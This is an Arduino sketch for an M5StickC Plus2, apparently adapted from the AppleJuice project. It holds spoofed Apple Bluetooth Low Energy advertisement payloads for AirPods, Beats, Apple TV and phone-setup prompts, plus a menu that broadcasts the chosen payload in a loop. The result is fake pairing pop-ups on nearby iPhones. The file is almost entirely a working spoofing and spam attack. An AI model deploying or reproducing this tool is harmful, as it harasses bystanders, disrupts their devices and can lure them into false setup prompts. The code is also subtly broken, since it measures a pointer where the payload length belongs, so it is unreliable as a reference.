// Source code: https://github.com/ECTO-1A/AppleJuice/
#include <Arduino.h>
#include <M5StickCPlus2.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

BLEAdvertising* pAdvertising;  // global variable
BLEAdvertisementData oAdvertisementData;

int delaySeconds = 2;
int cursor = 0;
uint8_t rotation = 3;
#define M5_LED 19
#define M5_BUTTON_RST 35
#define M5_BUTTON_HOME 37
struct MENU {
  char name[19];
  int command;
};

const uint8_t Airpods[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t AirpodsPro[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t AirpodsMax[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t AirpodsGen2[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t AirpodsGen3[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t AirpodsProGen2[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t PowerBeats[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t PowerBeatsPro[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsSoloPro[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsStudioBuds[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsFlex[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsX[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsSolo3[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsStudio3[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsStudioPro[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsFitPro[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t BeatsStudioBudsPlus[31] PROGMEM = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const uint8_t AppleTVSetup[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t AppleTVPair[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t AppleTVNewUser[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t AppleTVAppleIDSetup[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t AppleTVWirelessAudioSync[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t AppleTVHomekitSetup[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t AppleTVKeyboard[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t AppleTVConnectingToNetwork[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t HomepodSetup[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t SetupNewPhone[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t TransferNumber[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
const uint8_t TVColorBalance[23] PROGMEM = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };

MENU ajmenu[] = {
  { "AirPods", 1 },
  { "AirPods Pro", 2 },
  { "AirPods Max", 3 },
  { "AirPods G2", 4 },
  { "AirPods G3", 5 },
  { "AirPods Pro G2", 6 },
  { "PowerBeats", 7 },
  { "PowerBeats Pro", 8 },
  { "Beats Solo Pro", 9 },
  { "Beats Studio Buds", 10 },
  { "Beats Flex", 11 },
  { "Beats X", 12 },
  { "Beats Solo 3", 13 },
  { "Beats Studio 3", 14 },
  { "Beats Studio Pro", 15 },
  { "Beats Fit Pro", 16 },
  { "Beats Studio Buds+", 17 },
  { "AppleTV Setup", 18 },
  { "AppleTV Pair", 19 },
  { "AppleTV New User", 20 },
  { "AppleTV AppleID", 21 },
  { "AppleTV Audio", 22 },
  { "AppleTV HomeKit", 23 },
  { "AppleTV Keyboard", 24 },
  { "AppleTV Network", 25 },
  { "TV Color Balance", 26 },
  { "Transfer Number", 27 },
  { "Setup New Phone", 28 },
};
void drawmenu() {
  StickCP2.Display.setRotation(rotation);
  StickCP2.Display.setTextSize(2);
  StickCP2.Display.fillScreen(BLACK);
  StickCP2.Display.setCursor(0, 5);
  // scrolling menu
  if (cursor > 5) {
    for (int i = 0 + (cursor - 5); i < (sizeof(ajmenu) / sizeof(MENU)); i++) {
      StickCP2.Display.print(F((cursor == i) ? ">" : " "));
      StickCP2.Display.println(ajmenu[i].name);
    }
  } else {
    for (
      int i = 0; i < (sizeof(ajmenu) / sizeof(MENU)); i++) {
      StickCP2.Display.print(F((cursor == i) ? ">" : " "));
      StickCP2.Display.println(ajmenu[i].name);
    }
  }
}
void apple_juice() {
  bool draw = true;
  if (true) {
    StickCP2.Display.setTextColor(GREEN, BLACK);
    StickCP2.Display.setTextSize(3);
    StickCP2.Display.setCursor(5, 10);
    StickCP2.Display.setRotation(rotation);
    StickCP2.Display.print(F("AppleJuice\n"));
    StickCP2.Display.setTextSize(2);
    StickCP2.Display.print(F("For M5StickC-Plus2\n\n\nSide Key: Next\nM5 Key: Select"));

    // Pause on splash screen for a bit
    delay(1000);

    Serial.begin(115200);
    Serial.println(F("Starting ESP32 BLE"));

    BLEDevice::init("");

    // Create the BLE Server
    BLEServer* pServer = BLEDevice::createServer();

    pAdvertising = pServer->getAdvertising();
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    drawmenu();
  }
  while (true) {
    if (digitalRead(39) == LOW) {
      cursor++;
      cursor = cursor % (sizeof(ajmenu) / sizeof(MENU));
      drawmenu();
      delay(250);
    }
    // Click M5 Button to select
    if (digitalRead(M5_BUTTON_HOME) == LOW) {
      int deviceType = ajmenu[cursor].command;
      // Also borrowed heavily from ronalstoner / ECTO-1A esp32 AppleJuice
      uint8_t* data;
      switch (deviceType) {
        case 1:
          data = (uint8_t*)Airpods;
          break;
        case 2:
          data = (uint8_t*)AirpodsPro;
          break;
        case 3:
          data = (uint8_t*)AirpodsMax;
          break;
        case 4:
          data = (uint8_t*)AirpodsGen2;
          break;
        case 5:
          data = (uint8_t*)AirpodsGen3;
          break;
        case 6:
          data = (uint8_t*)AirpodsProGen2;
          break;
        case 7:
          data = (uint8_t*)PowerBeats;
          break;
        case 8:
          data = (uint8_t*)PowerBeatsPro;
          break;
        case 9:
          data = (uint8_t*)BeatsSoloPro;
          break;
        case 10:
          data = (uint8_t*)BeatsStudioBuds;
          break;
        case 11:
          data = (uint8_t*)BeatsFlex;
          break;
        case 12:
          data = (uint8_t*)BeatsX;
          break;
        case 13:
          data = (uint8_t*)BeatsSolo3;
          break;
        case 14:
          data = (uint8_t*)BeatsStudio3;
          break;
        case 15:
          data = (uint8_t*)BeatsStudioPro;
          break;
        case 16:
          data = (uint8_t*)BeatsFitPro;
          break;
        case 17:
          data = (uint8_t*)BeatsStudioBudsPlus;
          break;
        case 18:
          data = (uint8_t*)AppleTVSetup;
          break;
        case 19:
          data = (uint8_t*)AppleTVPair;
          break;
        case 20:
          data = (uint8_t*)AppleTVNewUser;
          break;
        case 21:
          data = (uint8_t*)AppleTVAppleIDSetup;
          break;
        case 22:
          data = (uint8_t*)AppleTVWirelessAudioSync;
          break;
        case 23:
          data = (uint8_t*)AppleTVHomekitSetup;
          break;
        case 24:
          data = (uint8_t*)AppleTVKeyboard;
          break;
        case 25:
          data = (uint8_t*)AppleTVConnectingToNetwork;
          break;
        case 26:
          data = (uint8_t*)TVColorBalance;
          break;
        case 27:
          data = (uint8_t*)TransferNumber;
          break;
        case 28:
          data = (uint8_t*)SetupNewPhone;
          break;
      }
      StickCP2.Display.fillScreen(BLACK);
      StickCP2.Display.setTextSize(2);
      StickCP2.Display.setCursor(5, 10);
      StickCP2.Display.setRotation(rotation);
      StickCP2.Display.print(F("Advertising:\n"));
      StickCP2.Display.print(ajmenu[cursor].name);
      StickCP2.Display.print(F("\n\nHold Side Key\n  To Exit"));
      while (true) {
        oAdvertisementData.addData(std::string((char*)data, sizeof((char*)data)));
        pAdvertising->setAdvertisementData(oAdvertisementData);
        digitalWrite(M5_LED, LOW);  //LED ON on Stick C Plus
        pAdvertising->start();
        digitalWrite(M5_LED, HIGH);  //LED OFF on Stick C Plus
        delay(delaySeconds * 1000);  // delay for delaySeconds seconds
        pAdvertising->stop();
        if (digitalRead(39) == LOW) {
          // Just do a software reset when done, easier than cleaning up pointers and vars.
          digitalWrite(M5_LED, LOW);
          break;
        }
      }
    }
    if (digitalRead(35) == 0) {
      break;
    }
  }
}